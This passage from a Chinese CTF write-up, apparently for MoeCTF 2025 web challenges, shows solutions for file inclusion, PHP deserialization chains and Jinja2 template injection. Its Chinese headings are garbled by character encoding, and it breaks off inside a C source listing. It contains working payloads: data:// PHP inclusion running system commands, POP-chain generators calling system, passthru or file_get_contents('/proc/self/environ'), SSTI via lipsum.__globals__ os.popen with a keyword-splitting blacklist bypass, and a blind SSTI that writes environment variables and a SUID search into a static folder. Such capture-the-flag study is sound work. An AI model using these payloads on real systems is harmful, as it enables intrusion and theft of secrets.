-æ˜†ä»‘æ˜Ÿé€”" class="headerlink" title="16 ç¬¬åå…­ç«  æ˜†ä»‘æ˜Ÿé€”"></a><strong>16 ç¬¬åå…­ç«  æ˜†ä»‘æ˜Ÿé€”</strong></h3><h4 id="è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="è€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«æ¼æ´"></a>è€ƒç‚¹ï¼š<strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong></h4><p><img src="/../images/image-20251014162605420-1760512687700-71.png" alt="image-20251014162605420"></p><p>phpä¼ªåè®®çš„data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&quot;ls /&quot;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&quot;cat /flag-OrvL3PF4K1VMXkEVzkNTMJsa8Txt7c.txt&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014163125848-1760512687700-69.png" alt="image-20251014163125848"></p><h3 id="17-ç¬¬åä¸ƒç« -æ˜Ÿéª¸è¿·é˜µÂ·ç¥å¿µé‡æ„"><a href="#17-ç¬¬åä¸ƒç« -æ˜Ÿéª¸è¿·é˜µÂ·ç¥å¿µé‡æ„" class="headerlink" title="17 ç¬¬åä¸ƒç«  æ˜Ÿéª¸è¿·é˜µÂ·ç¥å¿µé‡æ„"></a><strong>17 ç¬¬åä¸ƒç«  æ˜Ÿéª¸è¿·é˜µÂ·ç¥å¿µé‡æ„</strong></h3><h4 id="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–"><a href="#è€ƒç‚¹ï¼šphpååºåˆ—åŒ–" class="headerlink" title="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–"></a>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–</h4><p><img src="/../images/image-20251014163228096-1760512687700-68.png" alt="image-20251014163228096"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c=new A();</span><br><span class="line">$c-&gt;a=&quot;system(&#x27;env&#x27;);&quot;;</span><br><span class="line">echo serialize($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„ååºåˆ—åŒ– ç»™aå¤åˆ¶ç›¸åº”çš„å‘½ä»¤å°±å¥½äº†</p><p><img src="/../images/image-20251014164009204-1760512687700-72.png" alt="image-20251014164009204"></p><h3 id="18-ç¬¬åå…«ç« -ä¸‡å·è¯¡é˜Â·åŠŸæ³•è¿ç¯"><a href="#18-ç¬¬åå…«ç« -ä¸‡å·è¯¡é˜Â·åŠŸæ³•è¿ç¯" class="headerlink" title="18 ç¬¬åå…«ç«  ä¸‡å·è¯¡é˜Â·åŠŸæ³•è¿ç¯"></a><strong>18 ç¬¬åå…«ç«  ä¸‡å·è¯¡é˜Â·åŠŸæ³•è¿ç¯</strong></h3><h4 id="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–-1"><a href="#è€ƒç‚¹ï¼šphpååºåˆ—åŒ–-1" class="headerlink" title="è€ƒç‚¹ï¼šphpååºåˆ—åŒ–"></a>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–</h4><p><img src="/../images/image-20251014164636541-1760512687700-73.png" alt="image-20251014164636541"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$code=&quot;phpinfo();&quot;;</span><br><span class="line">$personB=new PersonB($code);</span><br><span class="line">$personA=new PersonA($personB);</span><br><span class="line">$serialized=serialize($personA);</span><br><span class="line">print(urlencode($serialized));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„privateä»¥åŠå‡½æ•°æ„é€ </p><p><img src="/../images/image-20251014165356363-1760512687700-74.png" alt="image-20251014165356363"></p><h3 id="19-ç¬¬åä¹ç« -æ˜Ÿç©¹çœŸç›¸Â·è¡¥å¤©å½’æº"><a href="#19-ç¬¬åä¹ç« -æ˜Ÿç©¹çœŸç›¸Â·è¡¥å¤©å½’æº" class="headerlink" title="19 ç¬¬åä¹ç«  æ˜Ÿç©¹çœŸç›¸Â·è¡¥å¤©å½’æº"></a><strong>19 ç¬¬åä¹ç«  æ˜Ÿç©¹çœŸç›¸Â·è¡¥å¤©å½’æº</strong></h3><h4 id="è€ƒç‚¹phpååºåˆ—åŒ–"><a href="#è€ƒç‚¹phpååºåˆ—åŒ–" class="headerlink" title="è€ƒç‚¹phpååºåˆ—åŒ–"></a>è€ƒç‚¹phpååºåˆ—åŒ–</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name-&gt;$id($age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __Check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $name($age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å¤šè§£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$cmd = &quot;cat /????&quot;;</span><br><span class="line"> </span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = &quot;system&quot;;</span><br><span class="line">$c-&gt;id = null;</span><br><span class="line"> </span><br><span class="line">$a = new PersonA();</span><br><span class="line"> </span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;__Check&quot;;</span><br><span class="line"> </span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"> </span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"> </span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">$c=new PersonC();</span><br><span class="line">$c-&gt;name=&quot;system&quot;;</span><br><span class="line">$c-&gt;age=&quot;love&quot;;</span><br><span class="line">$a=new PersonA();</span><br><span class="line">$a-&gt;name=$c; </span><br><span class="line">$a-&gt;id=&quot;__Check&quot;;</span><br><span class="line">$a-&gt;age=&quot;cat /f*&quot;;</span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo urlencode($payload);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="19-ç¬¬åä¹ç« -revenge"><a href="#19-ç¬¬åä¹ç« -revenge" class="headerlink" title="19 ç¬¬åä¹ç« _revenge"></a><strong>19 ç¬¬åä¹ç« _revenge</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†system</p><p><img src="/../images/image-20251015142726469-1760512687700-75.png" alt="image-20251015142726469"></p><p><a href="https://blog.csdn.net/2303_76585504/article/details/152668659">moectf 2025 writeup-CSDNåšå®¢</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  class Person&#123;public $name,$id,$age;&#125;</span><br><span class="line">class PersonA extends Person&#123;&#125;</span><br><span class="line">class PersonB extends Person&#123;&#125;</span><br><span class="line">class PersonC extends Person&#123;&#125;</span><br><span class="line">$c=new PersonC;$b=new PersonB;$a=new PersonA;</span><br><span class="line">$c-&gt;name=&#x27;passthru&#x27;;$c-&gt;id=$b;$c-&gt;age=&#x27;phantom&#x27;;</span><br><span class="line">$b-&gt;id=$a;$b-&gt;name=&#x27;env&gt;flag.txt&#x27;;</span><br><span class="line">$a-&gt;id=&#x27;check&#x27;;</span><br><span class="line">echo urlencode(serialize($c));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;/proc/self/environ&quot;;</span><br><span class="line">$function = &quot;file_get_contents&quot;;</span><br><span class="line"></span><br><span class="line">$c = new PersonC();</span><br><span class="line">$c-&gt;name = $function;</span><br><span class="line"></span><br><span class="line">$a = new PersonA();</span><br><span class="line"></span><br><span class="line">$a-&gt;name = $c;</span><br><span class="line">$a-&gt;id = &quot;check&quot;;</span><br><span class="line"></span><br><span class="line">$b = new PersonB();</span><br><span class="line">$b-&gt;id = $a;</span><br><span class="line">$b-&gt;name = $cmd;</span><br><span class="line"></span><br><span class="line">$c-&gt;id = $b;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="20-ç¬¬äºŒåç« -å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”"><a href="#20-ç¬¬äºŒåç« -å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”" class="headerlink" title="20 ç¬¬äºŒåç«  å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”"></a><strong>20 ç¬¬äºŒåç«  å¹½å†¥è¡€æµ·Â·å¹»è¯­å¿ƒé­”</strong></h3><h4 id="è€ƒç‚¹ï¼šæ— é™åˆ¶SSTI"><a href="#è€ƒç‚¹ï¼šæ— é™åˆ¶SSTI" class="headerlink" title="è€ƒç‚¹ï¼šæ— é™åˆ¶SSTI"></a>è€ƒç‚¹ï¼šæ— é™åˆ¶<code>SSTI</code></h4><p><img src="/../images/image-20251014195214923-1760512687700-76.png" alt="image-20251014195214923"></p><p>ä½¿ç”¨çš„æ˜¯<code>render_template_string()</code>å‡½æ•°åŠ¨æ€æ¸²æŸ“ï¼Œç”¨æˆ·å¯æ§çš„ <code>username</code>å‚æ•°<strong>ç›´æ¥æ‹¼æ¥</strong>åˆ°æ¨¡æ¿å­—ç¬¦ä¸²ä¸­</p><p><img src="/../images/image-20251014195338347-1760512687700-77.png" alt="image-20251014195338347"></p><p>ç›´æ¥è·å¾—shellï¼ŒæŸ¥çœ‹ç¯å¢ƒå˜é‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read()&#125;&#125;&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014195629362-1760512687700-78.png" alt="image-20251014195629362"></p><h3 id="21-ç¬¬äºŒåä¸€ç« -å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€"><a href="#21-ç¬¬äºŒåä¸€ç« -å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€" class="headerlink" title="21 ç¬¬äºŒåä¸€ç«  å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€"></a><strong>21 ç¬¬äºŒåä¸€ç«  å¾€ç”Ÿæ¼©æ¶¡Â·è¨€çµæ­»å±€</strong></h3><h4 id="è€ƒç‚¹ï¼šç®€å•é™åˆ¶SSTI"><a href="#è€ƒç‚¹ï¼šç®€å•é™åˆ¶SSTI" class="headerlink" title="è€ƒç‚¹ï¼šç®€å•é™åˆ¶SSTI"></a>è€ƒç‚¹ï¼šç®€å•é™åˆ¶<code>SSTI</code></h4><p>æºç è¿˜æ˜¯å’Œä¹‹å‰çš„ä¸€æ ·ä½†æ˜¯åŠ äº†ä¸€ä¸ªé»‘åå•</p><p><img src="/../images/image-20251014195837206-1760455318317-4-1760512687700-79.png" alt="image-20251014195837206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; ä»£æ›¿ &#123;&#123; ... &#125;&#125;</span><br><span class="line">æ‹¼æ¥å…³é”®å­—[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014232940628-1760512687700-81.png" alt="image-20251014232940628"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=&#123;%print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;env&#x27;).read())%&#125;&amp;password=1</span><br></pre></td></tr></table></figure><h3 id="22-ç¬¬äºŒåäºŒç« -è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ"><a href="#22-ç¬¬äºŒåäºŒç« -è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ" class="headerlink" title="22 ç¬¬äºŒåäºŒç«  è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ"></a><strong>22 ç¬¬äºŒåäºŒç«  è¡€æµ·æ ¸å¿ƒÂ·åƒå¹´æ‰‹æ®µ</strong></h3><h4 id="è€ƒç‚¹ï¼šæ— å›æ˜¾SSTI"><a href="#è€ƒç‚¹ï¼šæ— å›æ˜¾SSTI" class="headerlink" title="è€ƒç‚¹ï¼šæ— å›æ˜¾SSTI"></a>è€ƒç‚¹ï¼šæ— å›æ˜¾<code>SSTI</code></h4><p><img src="/../images/image-20251014233417847-1760512687700-80.png" alt="image-20251014233417847"></p><p>æ²¡æœ‰å°† <code>render_template_string</code> å‡½æ•°çš„è¿”å›å€¼èµ‹ç»™ä»»ä½•å˜é‡,å³æ˜¯æ— å›æ˜¾ï¼Œå¸¸è§„çš„å†™æ–‡ä»¶åˆ°staticã€è¿™é‡Œæœ‰å¤šç§è§£ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;env &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°flagä¸åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼Œls &#x2F; å‘ç°flagä½†æ˜¯æ²¡æœ‰æƒé™è¯»æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;find / -perm -4000&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br><span class="line">ã€æŸ¥æ‰¾å…·æœ‰sudiæƒé™æ–‡ä»¶ã€‘</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014234711691-1760512687700-84.png" alt="image-20251014234711691"></p><p>&#x2F;usr&#x2F;bin&#x2F;revç”¨äºç¿»è½¬å­—ç¬¦ä¸² ä½†æ˜¯å‘ç°æ— å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;/usr/bin/rev /flag&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹èƒ½å¤Ÿä½¿ç”¨çš„å‘½ä»¤,å‘ç°æœ‰ä¸ªrev.cæ–‡ä»¶ã€å®åˆ™çœ‹äº†å®˜wpæ‰çŸ¥é“ã€‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static; cat /usr/bin&gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251014235714305-1760512687700-85.png" alt="image-20251014235714305"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;mkdir static;cat /usr/bin/rev.c &gt; ./static/out.txt&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">    for(int i = 